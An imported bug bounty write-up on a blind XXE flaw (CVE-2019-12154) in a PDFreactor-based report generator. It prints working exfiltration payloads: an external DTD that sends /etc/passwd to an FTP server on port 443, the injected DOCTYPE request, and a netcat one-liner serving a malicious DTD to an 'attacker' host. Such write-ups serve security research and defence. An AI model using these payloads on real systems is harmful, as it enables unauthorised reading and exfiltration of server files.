---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-13_data-exfiltration-through-blind-xxe-on-pdf-generator.md
original_filename: 2022-09-13_data-exfiltration-through-blind-xxe-on-pdf-generator.md
title: Data Exfiltration through Blind XXE on PDF Generator
category: documents
detected_topics:
- command-injection
- race-condition
- api-security
tags:
- imported
- documents
- command-injection
- race-condition
- api-security
language: en
raw_sha256: c2fcc904c16a52ef4c8c2372b845284add665dfaec08ce0e6f8524e95378f96d
text_sha256: 1616459812f1b496491de5cbb46b8ae546ed28c93f6fbb3e725f847d84826251
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Data Exfiltration through Blind XXE on PDF Generator

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-13_data-exfiltration-through-blind-xxe-on-pdf-generator.md
- Source Type: markdown
- Detected Topics: command-injection, race-condition, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `c2fcc904c16a52ef4c8c2372b845284add665dfaec08ce0e6f8524e95378f96d`
- Text SHA256: `1616459812f1b496491de5cbb46b8ae546ed28c93f6fbb3e725f847d84826251`


## Content

---
title: "Data Exfiltration through Blind XXE on PDF Generator"
url: "https://arben.sh/bugbounty/Blind-XXE-CVE-2019-12154/"
final_url: "https://arben.sh/bugbounty/Blind-XXE-CVE-2019-12154/"
authors: ["Arben Shala (@arbennsh)"]
bugs: ["Blind XXE", "WAF bypass"]
publication_date: "2022-09-13"
added_date: "2022-09-26"
source: "pentester.land/writeups.json"
original_index: 2172
---

## Data Exfiltration through Blind XXE on PDF Generator

# Summary:

In this post, I will explain how I found a Blind XXE injection on PDF Generator that was vulnerable to CVE-2019-12154. However, in order to exfilftrate data, I had to bypass some WAF restrictions. 

![image49](/assets/images/49.png)

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. 

The web application that I was testing was designed for financial operations, and low-level users were able to generate reports. Because this was a private bug bounty program, I’ve redacted some of the screenshots below and referred to the target as **“redacted.com”**. 

RealObjects PDFreactor (version 9.1.97971) was used in the web application to generate PDF reports. Versions of PDFReactor prior to “10.1.1” are vulnerable to CVE-2019-12154, which does not have a publicly available PoC, but I was able to reproduce the issue by injecting malicious XML content and exfiltrate data using external DTD’s. 

In order to reproduce this vulnerability, two attacking machines with publicly accessible IP addresses were required. This was due to the PDF Generator machine’s firewall only allowing requests to port 443. The need for an SSL certificate was eliminated because I was able to bypass the application logic by using **http://** as protocol and appending port **:443** at the end of the url, such as **http://attacker.com:443**.

# Steps to Reproduce:

**1\. Preparing the needed scripts and payloads:**

While exploiting this vulnerability, I had pointed the below subdomains to two different IP’s. 

  1. http.arben.sh -> [IP_HERE]
  2. ftp.arben.sh -> [ANOTHER_IP_HERE]

On the `ftp.arben.sh` server I used [xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb) which uses Ruby language to launch an FTP server on the attacker’s specified port (in this case 443). 

To do this, I changed line nr. 3 on xxe-ftp-server.rb script from **“ftp_server = TCPServer.new 2121”** to **“ftp_server = TCPServer.new 443** ”. 

Then fired up the script using the following command:

> $> ruby xxe-ftp-server.rb

Heading over to `http.arben.sh` subdomain, in the directory where the HTTP server would be running, I created a file named **payload.dtd** with the following content. 
  
  
  <!ENTITY % stuff SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY external SYSTEM 'ftp://ftp.arben.sh:443/%stuff;'>">
  

A simple way to start a HTTP server on a desired port is by using Python with the following command:

> $> python3 -m http.server 443

**2\. Sending the malicious request:**

I logged in using my low-privileged account and navigated to the report generation page from the left menu. I had BurpSuite on the background intercepting the requests and clicked on the “PDF” text (marked with red sign as shown in the screenshot below) in order to generate the PDF.

![image46](/assets/images/46.png)

On the intercepted request being made to “https://redacted.com/redacted/api/v1/pdf/download”, I then edited the **htmlBody=** parameter with the following payload (URL encoded): 
  
  
  <!DOCTYPE foo [ <!ENTITY % pe SYSTEM "https://http.arben.sh:443/payload.dtd"> %pe; %param1; ]>
  <foo>&external;</foo>
  

  * The above payload would send a HTTP request to our HTTP server and execute the payload stored within **payload.dtd** , which would then exfiltrate data of **/etc/passwd** (or any specified file/directory) to our FTP server as shown on the screenshots below. Even though the target’s server responded with a “500 Internal Server Error” status code, the payload was being processed in the backend.

![image47](/assets/images/47.png)

Heading over to our virtual private server’s, we saw that a request for **payload.dtd** was made and we began receiving data on our FTP server. We were able to easily enumerate files and directories on the target’s system because this PDFGenerator was built in Java.

![image48](/assets/images/48.png)

When I mentioned this issue to my friend [0xCela](https://twitter.com/0xcela), he came up with a One-Liner that would eliminate the need for two private servers. 

An attacker could use the **netcat** utility to listen on port 443 and serve a static response (malicious dtd), then kill the HTTP server and immediately start an FTP server using the Ruby script. Even though this appears to be simple because it requires less effort to set up the payloads, it may only work occasionally due to race conditions and lower the vulnerability severity, but again it would reduce the attacker’s cost. 

**Command on VPS:**
  
  
  echo -e 'HTTP/1.1 200 OK\n\n<!ENTITY % payl SYSTEM '"'"'file:///etc/passwd'"'"'>\n<!ENTITY % int "<!ENTITY &#37; trick SYSTEM '"'"'ftp://attacker:443/%payl;'"'"'>">' | nc -N -lnvp 443; ruby xxe-ftp-server.rb
  
  

**Request payload on BurpSuite:**
  
  
  <?xml version="1.0"?><!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://attacker:443/">%remote;%int;%trick;]>
  

_Note: A PDF Generator may appear insignificant at first glance but it can be an open door to your organization for the attacker. To resolve such issues, make sure your software is always up to date and that proper WAF rules are in place._

_Thank you for taking the time to read this, and I hope you find it useful._
